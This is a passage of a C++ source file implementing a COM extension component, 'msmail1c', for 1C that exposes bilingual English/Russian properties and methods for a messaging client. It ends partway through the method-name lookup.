/*-
 * Copyright (C) 2005-2006 Guram Dukashvili. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
//------------------------------------------------------------------------------
// msmail1cImpl.cpp : Implementation of Cmsmail1c

#include "stdafx.h"
#include "msmail1cImpl.h"
#include "Registry.h"

//------------------------------------------------------------------------------
////////////////////////////////////////////////////////////////////////////////
//------------------------------------------------------------------------------
Cmsmail1c::~Cmsmail1c()
{
}
//------------------------------------------------------------------------------
Cmsmail1c::Cmsmail1c() :
  pBackConnection_(NULL),
  pAsyncEvent_(NULL),
  active_(false),
  lastError_(0)
{
}
//------------------------------------------------------------------------------
// IInitDone Methods
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::Init(LPDISPATCH pBackConnection)
{
//  stdErr.enableDebugLevel(9);
  pBackConnection_ = pBackConnection;
  pBackConnection_->AddRef();
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::Done()
{
  client_.close();
  if( pAsyncEvent_ != NULL ){
    pAsyncEvent_->Release();
    pAsyncEvent_ = NULL;
  }
  if( pBackConnection_ != NULL ) pBackConnection_->Release();
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetInfo(SAFEARRAY ** pInfo)
{
  long lInd = 0;
  VARIANT varVersion;
  V_VT(&varVersion) = VT_I4;
  V_I4(&varVersion) = 2000;
  return SafeArrayPutElement(*pInfo,&lInd,&varVersion);
}
//------------------------------------------------------------------------------
// ILanguageExtender Methods
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::RegisterExtensionAs(BSTR * bstrExtensionName)
{
  return (*bstrExtensionName = SysAllocString(L"msmail1c")) != NULL ? S_OK : E_OUTOFMEMORY;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetNProps(long * plProps)
{
  *plProps = 21;
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::FindProp(BSTR bstrPropName,long * plPropNum)
{
  if( _wcsicoll(bstrPropName,L"Name") == 0 ) *plPropNum = 0;
  else
  if( _wcsicoll(bstrPropName,L"Наименование") == 0 ) *plPropNum = 0;
  else
  if( _wcsicoll(bstrPropName,L"Active") == 0 ) *plPropNum = 1;
  else
  if( _wcsicoll(bstrPropName,L"Активирован") == 0 ) *plPropNum = 1;
  else
  if( _wcsicoll(bstrPropName,L"ProcessPriority") == 0 ) *plPropNum = 2;
  else
  if( _wcsicoll(bstrPropName,L"ПриоритетПроцесса") == 0 ) *plPropNum = 2;
  else
  if( _wcsicoll(bstrPropName,L"ErrorCode") == 0 ) *plPropNum = 3;
  else
  if( _wcsicoll(bstrPropName,L"КодОшибки") == 0 ) *plPropNum = 3;
  else
  if( _wcsicoll(bstrPropName,L"User") == 0 ) *plPropNum = 4;
  else
  if( _wcsicoll(bstrPropName,L"Пользователь") == 0 ) *plPropNum = 4;
  else
  if( _wcsicoll(bstrPropName,L"Key") == 0 ) *plPropNum = 5;
  else
  if( _wcsicoll(bstrPropName,L"Ключ") == 0 ) *plPropNum = 5;
  else
  if( _wcsicoll(bstrPropName,L"Groups") == 0 ) *plPropNum = 6;
  else
  if( _wcsicoll(bstrPropName,L"Группы") == 0 ) *plPropNum = 6;
  else
  if( _wcsicoll(bstrPropName,L"MailServer") == 0 ) *plPropNum = 7;
  else
  if( _wcsicoll(bstrPropName,L"ПочтовыйСервер") == 0 ) *plPropNum = 7;
  else
  if( _wcsicoll(bstrPropName,L"ConfigFile") == 0 ) *plPropNum = 8;
  else
  if( _wcsicoll(bstrPropName,L"КонфигурационныйФайл") == 0 ) *plPropNum = 8;
  else
  if( _wcsicoll(bstrPropName,L"LogFile") == 0 ) *plPropNum = 9;
  else
  if( _wcsicoll(bstrPropName,L"ЛогФайл") == 0 ) *plPropNum = 9;
  else
  if( _wcsicoll(bstrPropName,L"LocalTime") == 0 ) *plPropNum = 10;
  else
  if( _wcsicoll(bstrPropName,L"ЛокальноеВремя") == 0 ) *plPropNum = 10;
  else
  if( _wcsicoll(bstrPropName,L"SystemTime") == 0 ) *plPropNum = 11;
  else
  if( _wcsicoll(bstrPropName,L"СистемноеВремя") == 0 ) *plPropNum = 11;
  else
  if( _wcsicoll(bstrPropName,L"UUID") == 0 ) *plPropNum = 12;
  else
  if( _wcsicoll(bstrPropName,L"ВУИД") == 0 ) *plPropNum = 12;
  else
  if( _wcsicoll(bstrPropName,L"RandomNumber") == 0 ) *plPropNum = 13;
  else
  if( _wcsicoll(bstrPropName,L"СлучайноеЧисло") == 0 ) *plPropNum = 13;
  else
  if( _wcsicoll(bstrPropName,L"Version") == 0 ) *plPropNum = 14;
  else
  if( _wcsicoll(bstrPropName,L"Версия") == 0 ) *plPropNum = 14;
  else
  if( _wcsicoll(bstrPropName,L"Connected") == 0 ) *plPropNum = 15;
  else
  if( _wcsicoll(bstrPropName,L"СоединениеУстановлено") == 0 ) *plPropNum = 15;
  else
  if( _wcsicoll(bstrPropName,L"WorkServer") == 0 ) *plPropNum = 16;
  else
  if( _wcsicoll(bstrPropName,L"РабочийСервер") == 0 ) *plPropNum = 16;
  else
  if( _wcsicoll(bstrPropName,L"ReceivedMessagesList") == 0 ) *plPropNum = 17;
  else
  if( _wcsicoll(bstrPropName,L"СписокПолученныхСообщений") == 0 ) *plPropNum = 17;
  else
  if( _wcsicoll(bstrPropName,L"DBList") == 0 ) *plPropNum = 18;
  else
  if( _wcsicoll(bstrPropName,L"СписокИБ") == 0 ) *plPropNum = 18;
  else
  if( _wcsicoll(bstrPropName,L"DBGroupList") == 0 ) *plPropNum = 19;
  else
  if( _wcsicoll(bstrPropName,L"ГрупповойСписокИБ") == 0 ) *plPropNum = 19;
  else
  if( _wcsicoll(bstrPropName,L"UserList") == 0 ) *plPropNum = 20;
  else
  if( _wcsicoll(bstrPropName,L"СписокПользователей") == 0 ) *plPropNum = 20;
  else
    return DISP_E_MEMBERNOTFOUND;
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetPropName(long lPropNum,long lPropAlias,BSTR * pbstrPropName)
{
  switch( lPropNum ){
    case 0 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"Name")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"Наименование")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 1 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"Active")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"Активирован")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 2 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"ProcessPriority")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"ПриоритетПроцесса")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 3 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"ErrorCode")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"КодОшибки")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 4 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"User")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"Пользователь")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 5 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"Key")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"Ключ")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 6 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"Groups")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"Группы")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 7 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"MailServer")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"ПочтовыйСервер")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 8 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"ConfigFile")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"КонфигурационныйФайл")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 9 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"LogFile")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"ЛогФайл")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 10 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"LocalTime")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"ЛокальноеВремя")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 11 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"SystemTime")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"СистемноеВремя")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 12 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"UUID")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"ВУИД")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 13 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"RandomNumber")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"СлучайноеЧисло")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 14 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"Version")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"Версия")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 15 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"Connected")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"СоединениеУстановлено")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 16 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"WorkServer")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"РабочийСервер")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 17 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"ReceivedMessagesList")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"СписокПолученныхСообщений")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 18 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"DBList")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"СписокИБ")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 19 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"DBGroupList")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"ГрупповойСписокИБ")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 20 :
      switch( lPropAlias ){
        case 0 :
          return (*pbstrPropName = SysAllocString(L"UserList")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrPropName = SysAllocString(L"СписокПользователей")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
  }
  return E_NOTIMPL;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetPropVal(long lPropNum,VARIANT * pvarPropVal)
{
  HRESULT hr = S_OK;
  try {
    switch( lPropNum ){
      case 0 :
        V_BSTR(pvarPropVal) = name_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 1 :
        if( V_VT(pvarPropVal) != VT_I4 ) hr = VariantChangeTypeEx(pvarPropVal,pvarPropVal,0,0,VT_I4);
        if( SUCCEEDED(hr) ) V_I4(pvarPropVal) = active_ ? 1 : 0;
        break;
      case 2 :
        if( V_VT(pvarPropVal) != VT_I4 ) hr = VariantChangeTypeEx(pvarPropVal,pvarPropVal,0,0,VT_I4);
        if( SUCCEEDED(hr) ){
          V_VT(pvarPropVal) = VT_BSTR;
          switch( GetPriorityClass(GetCurrentProcess()) ){
            case IDLE_PRIORITY_CLASS :
              V_BSTR(pvarPropVal) = SysAllocString(L"IDLE_PRIORITY_CLASS");
              break;
            case BELOW_NORMAL_PRIORITY_CLASS :
              V_BSTR(pvarPropVal) = SysAllocString(L"BELOW_NORMAL_PRIORITY_CLASS");
              break;
            case NORMAL_PRIORITY_CLASS :
              V_BSTR(pvarPropVal) = SysAllocString(L"NORMAL_PRIORITY_CLASS");
              break;
            case ABOVE_NORMAL_PRIORITY_CLASS :
              V_BSTR(pvarPropVal) = SysAllocString(L"ABOVE_NORMAL_PRIORITY_CLASS");
              break;
            case HIGH_PRIORITY_CLASS :
              V_BSTR(pvarPropVal) = SysAllocString(L"HIGH_PRIORITY_CLASS");
              break;
            case REALTIME_PRIORITY_CLASS :
              V_BSTR(pvarPropVal) = SysAllocString(L"REALTIME_PRIORITY_CLASS");
              break;
            default :
              V_VT(pvarPropVal) = VT_I4;
              V_I4(pvarPropVal) = GetPriorityClass(GetCurrentProcess());
          }
          if( V_VT(pvarPropVal) == VT_BSTR && V_BSTR(pvarPropVal) == NULL ) hr = E_OUTOFMEMORY;
        }
        break;
      case 3 :
        if( V_VT(pvarPropVal) != VT_I4 ) hr = VariantChangeTypeEx(pvarPropVal,pvarPropVal,0,0,VT_I4);
        if( SUCCEEDED(hr) ) V_I4(pvarPropVal) = lastError_;
        break;
      case 4 : // User
        V_BSTR(pvarPropVal) = user_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 5 : // Key
        V_BSTR(pvarPropVal) = key_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 6 : // Groups
        V_BSTR(pvarPropVal) = groups_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 7 : // MailServer
        V_BSTR(pvarPropVal) = mailServer_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 8 : // ConfigFile
        V_BSTR(pvarPropVal) = configFile_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 9 : // LogFile
        V_BSTR(pvarPropVal) = logFile_.getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 10 : // LocalTime
        V_BSTR(pvarPropVal) = utf8::int2Str(getlocaltimeofday()).getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 11 : // SystemTime
        V_BSTR(pvarPropVal) = utf8::int2Str(gettimeofday()).getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 12 : // UUID
        {
          UUID uuid;
          createUUID(uuid);
          utf8::String suuid(base32Encode(&uuid,sizeof(uuid)));
          V_BSTR(pvarPropVal) = suuid.getOLEString();
          V_VT(pvarPropVal) = VT_BSTR;
        }
        break;
      case 13 : // RandomNumber
        V_BSTR(pvarPropVal) = utf8::int2Str(rnd_.random()).getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 14 : // Version
        V_BSTR(pvarPropVal) = getTimestamp(__DATE__,__TIME__).getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 15 : // Connected
        if( V_VT(pvarPropVal) != VT_I4 ) hr = VariantChangeTypeEx(pvarPropVal,pvarPropVal,0,0,VT_I4);
        if( SUCCEEDED(hr) ){
          V_I4(pvarPropVal) = 0;
          if( active_ ){
            AutoLock<FiberInterlockedMutex> lock(client_.connectedMutex_);
            V_I4(pvarPropVal) = client_.connected_ ? 1 : 0;
          }
        }
        break;
      case 16 : // WorkServer
        {
          AutoLock<FiberInterlockedMutex> lock(client_.connectedMutex_);
          if( active_ && client_.connected_ ){
            V_BSTR(pvarPropVal) = client_.connectedToServer_.getOLEString();
            V_VT(pvarPropVal) = VT_BSTR;
          }
          else {
            if( V_VT(pvarPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(pvarPropVal,pvarPropVal,0,0,VT_BSTR);
          }
        }
        break;
      case 17 : // ReceivedMessagesList
        V_BSTR(pvarPropVal) = client_.getReceivedMessageList().getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 18 : // DBList
        V_BSTR(pvarPropVal) = client_.getDBList().getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 19 : // DBGroupList
        V_BSTR(pvarPropVal) = client_.getDBGroupList().getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
      case 20 : // UserList
        V_BSTR(pvarPropVal) = client_.getUserList().getOLEString();
        V_VT(pvarPropVal) = VT_BSTR;
        break;
    }
  }
  catch( ExceptionSP & e ){
    hr = HRESULT_FROM_WIN32(e->code() - errorOffset);
  }
  return hr;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::SetPropVal(long lPropNum,VARIANT * varPropVal)
{
  HRESULT hr = S_OK;
  bool r;
  try {
    switch( lPropNum ){
      case 0 :
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) name_ = V_BSTR(varPropVal);
        break;
      case 1 :
        if( V_VT(varPropVal) != VT_I4 ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_I4);
        if( SUCCEEDED(hr) ){
          if( V_I4(varPropVal) != 0 && pAsyncEvent_ == NULL ){
            hr = pBackConnection_->QueryInterface(IID_IAsyncEvent,(void **) &pAsyncEvent_);
            if( SUCCEEDED(hr) ) hr = pAsyncEvent_->SetEventBufferDepth(1000000);
          }
          if( SUCCEEDED(hr) ){
            if( V_I4(varPropVal) != 0 ){
              client_.close();
              active_ = false;
              client_.pAsyncEvent_ = pAsyncEvent_;
              client_.name_ = name_;
              client_.user_ = user_;
              client_.key_ = key_;
              client_.groups_ = groups_;
              client_.mailServer_ = mailServer_;
              client_.configFile_ = configFile_;
              client_.logFile_ = logFile_;
              stdErr.fileName(logFile_);
              client_.config_->parse();
              stdErr.rotationThreshold(client_.config_->value("debug_file_rotate_threshold",1024 * 1024));
              stdErr.rotatedFileCount(client_.config_->value("debug_file_rotate_count",10));
              stdErr.setDebugLevels(client_.config_->value("debug_levels","+0,+1,+2,+3"));
              client_.open();
              active_ = true;
            }
            else {
              client_.close();
              active_ = false;
            }
            if( V_I4(varPropVal) == 0 && pAsyncEvent_ != NULL ){
              pAsyncEvent_->Release();
              pAsyncEvent_ = NULL;
            }
          }
        }
        break;
      case 2  :
        r = false;
        if( V_VT(varPropVal) == VT_BSTR ){
          r = true;
          utf8::String s(V_BSTR(varPropVal));
          if( s.strcasecmp("IDLE_PRIORITY_CLASS") == 0 )
            SetPriorityClass(GetCurrentProcess(),IDLE_PRIORITY_CLASS);
          else
          if( s.strcasecmp("BELOW_NORMAL_PRIORITY_CLASS") == 0 )
            SetPriorityClass(GetCurrentProcess(),BELOW_NORMAL_PRIORITY_CLASS);
          else
          if( s.strcasecmp("NORMAL_PRIORITY_CLASS") == 0 )
            SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
          else
          if( s.strcasecmp("ABOVE_NORMAL_PRIORITY_CLASS") == 0 )
            SetPriorityClass(GetCurrentProcess(),ABOVE_NORMAL_PRIORITY_CLASS);
          else
          if( s.strcasecmp("HIGH_PRIORITY_CLASS") == 0 )
            SetPriorityClass(GetCurrentProcess(),HIGH_PRIORITY_CLASS);
          else
          if( s.strcasecmp("REALTIME_PRIORITY_CLASS") == 0 )
            SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
          else
            r = false;
        }
        if( !r && (V_VT(varPropVal) == VT_I4 || VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_I4) == S_OK) ){
          SetPriorityClass(GetCurrentProcess(),V_I4(varPropVal));
        }
        break;
      case 3 :
        hr = E_NOTIMPL;
        break;
      case 4 : // User
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) user_ = V_BSTR(varPropVal);
        break;
      case 5 : // Key
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) key_ = V_BSTR(varPropVal);
        break;
      case 6 : // Groups
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) groups_ = V_BSTR(varPropVal);
        break;
      case 7 : // MailServer
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) mailServer_ = V_BSTR(varPropVal);
        break;
      case 8 : // ConfigFile
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) configFile_ = V_BSTR(varPropVal);
        break;
      case 9 : // LogFile
        if( V_VT(varPropVal) != VT_BSTR ) hr = VariantChangeTypeEx(varPropVal,varPropVal,0,0,VT_BSTR);
        if( SUCCEEDED(hr) ) logFile_ = V_BSTR(varPropVal);
        break;
      case 10 : // LocalTime
        hr = E_NOTIMPL;
        break;
      case 11 : // SystemTime
        hr = E_NOTIMPL;
        break;
      case 12 : // UUID
        hr = E_NOTIMPL;
        break;
      case 13 : // RandomNumber
        hr = E_NOTIMPL;
        break;
      case 14 : // Version
        hr = E_NOTIMPL;
        break;
      case 15 :
        hr = E_NOTIMPL;
        break;
      case 16 :
        hr = E_NOTIMPL;
        break;
      case 17 :
        hr = E_NOTIMPL;
        break;
      case 18 :
        hr = E_NOTIMPL;
        break;
      case 19 :
        hr = E_NOTIMPL;
        break;
      case 20 :
        hr = E_NOTIMPL;
        break;
    }
  }
  catch( ExceptionSP & e ){
    hr = HRESULT_FROM_WIN32(e->code() - errorOffset);
  }
  return hr;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::IsPropReadable(long lPropNum,BOOL * pboolPropRead)
{
  switch( lPropNum ){
    case 0 : *pboolPropRead = TRUE; break;
    case 1 : *pboolPropRead = TRUE; break;
    case 2 : *pboolPropRead = TRUE; break;
    case 3 : *pboolPropRead = TRUE; break;
    case 4 : *pboolPropRead = TRUE; break;
    case 5 : *pboolPropRead = TRUE; break;
    case 6 : *pboolPropRead = TRUE; break;
    case 7 : *pboolPropRead = TRUE; break;
    case 8 : *pboolPropRead = TRUE; break;
    case 9 : *pboolPropRead = TRUE; break;
    case 10 : *pboolPropRead = TRUE; break;
    case 11 : *pboolPropRead = TRUE; break;
    case 12 : *pboolPropRead = TRUE; break;
    case 13 : *pboolPropRead = TRUE; break;
    case 14 : *pboolPropRead = TRUE; break;
    case 15 : *pboolPropRead = TRUE; break;
    case 16 : *pboolPropRead = TRUE; break;
    case 17 : *pboolPropRead = TRUE; break;
    case 18 : *pboolPropRead = TRUE; break;
    case 19 : *pboolPropRead = TRUE; break;
    case 20 : *pboolPropRead = TRUE; break;
    default : return E_NOTIMPL;
  }
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::IsPropWritable(long lPropNum,BOOL * pboolPropWrite)
{
  switch( lPropNum ){
    case 0 : *pboolPropWrite = TRUE; break;
    case 1 : *pboolPropWrite = TRUE; break;
    case 2 : *pboolPropWrite = TRUE; break;
    case 3 : *pboolPropWrite = FALSE; break;
    case 4 : *pboolPropWrite = TRUE; break;
    case 5 : *pboolPropWrite = TRUE; break;
    case 6 : *pboolPropWrite = TRUE; break;
    case 7 : *pboolPropWrite = TRUE; break;
    case 8 : *pboolPropWrite = TRUE; break;
    case 9 : *pboolPropWrite = TRUE; break;
    case 10 : *pboolPropWrite = FALSE; break;
    case 11 : *pboolPropWrite = FALSE; break;
    case 12 : *pboolPropWrite = FALSE; break;
    case 13 : *pboolPropWrite = FALSE; break;
    case 14 : *pboolPropWrite = FALSE; break;
    case 15 : *pboolPropWrite = FALSE; break;
    case 16 : *pboolPropWrite = FALSE; break;
    case 17 : *pboolPropWrite = FALSE; break;
    case 18 : *pboolPropWrite = FALSE; break;
    case 19 : *pboolPropWrite = FALSE; break;
    case 20 : *pboolPropWrite = FALSE; break;
    default : return E_NOTIMPL;
  }
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetNMethods(long * plMethods)
{
  *plMethods = 15;
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::FindMethod(BSTR bstrMethodName,long * plMethodNum)
{
  if( _wcsicoll(bstrMethodName,L"LockFile") == 0 ) *plMethodNum = 0;
  else
  if( _wcsicoll(bstrMethodName,L"БлокироватьФайл") == 0 ) *plMethodNum = 0;
  else
  if( _wcsicoll(bstrMethodName,L"UnlockFile") == 0 ) *plMethodNum = 1;
  else
  if( _wcsicoll(bstrMethodName,L"РазблокироватьФайл") == 0 ) *plMethodNum = 1;
  else
  if( _wcsicoll(bstrMethodName,L"GetLastError") == 0 ) *plMethodNum = 2;
  else
  if( _wcsicoll(bstrMethodName,L"ПолучитьКодОшибки") == 0 ) *plMethodNum = 2;
  else
  if( _wcsicoll(bstrMethodName,L"Sleep") == 0 ) *plMethodNum = 3;
  else
  if( _wcsicoll(bstrMethodName,L"Спать") == 0 ) *plMethodNum = 3;
  else
  if( _wcsicoll(bstrMethodName,L"SleepIn") == 0 ) *plMethodNum = 4;
  else
  if( _wcsicoll(bstrMethodName,L"СпатьВ") == 0 ) *plMethodNum = 4;
  else
  if( _wcsicoll(bstrMethodName,L"TextToFile") == 0 ) *plMethodNum = 5;
  else
  if( _wcsicoll(bstrMethodName,L"ТекстВФайл") == 0 ) *plMethodNum = 5;
  else
  if( _wcsicoll(bstrMethodName,L"NewMessage") == 0 ) *plMethodNum = 6;
  else
  if( _wcsicoll(bstrMethodName,L"НовоеСообщение") == 0 ) *plMethodNum = 6;
  else
  if( _wcsicoll(bstrMethodName,L"SetMessageAttribute") == 0 ) *plMethodNum = 7;
  else
  if( _wcsicoll(bstrMethodName,L"УстановитьАтрибутСообщения") == 0 ) *plMethodNum = 7;
  else
  if( _wcsicoll(bstrMethodName,L"GetMessageAttribute") == 0 ) *plMethodNum = 8;
  else
  if( _wcsicoll(bstrMethodName,L"ПолучитьАтрибутСообщения") == 0 ) *plMethodNum = 8;
  else
  if( _wcsicoll(bstrMethodName,L"SendMessage") == 0 ) *plMethodNum = 9;
  else
  if( _wcsicoll(bstrMethodName,L"ПослатьСообщение") == 0 ) *plMethodNum = 9;
  else
  if( _wcsicoll(bstrMethodName,L"RemoveMessage") == 0 ) *plMethodNum = 10;
  else
  if( _wcsicoll(bstrMethodName,L"УдалитьСообщение") == 0 ) *plMethodNum = 10;
  else
  if( _wcsicoll(bstrMethodName,L"GetDB") == 0 ) *plMethodNum = 11;
  else
  if( _wcsicoll(bstrMethodName,L"ПолучитьИБ") == 0 ) *plMethodNum = 11;
  else
  if( _wcsicoll(bstrMethodName,L"CopyMessage") == 0 ) *plMethodNum = 12;
  else
  if( _wcsicoll(bstrMethodName,L"СкопироватьСообщение") == 0 ) *plMethodNum = 12;
  else
  if( _wcsicoll(bstrMethodName,L"RemoveMessageAttribute") == 0 ) *plMethodNum = 13;
  else
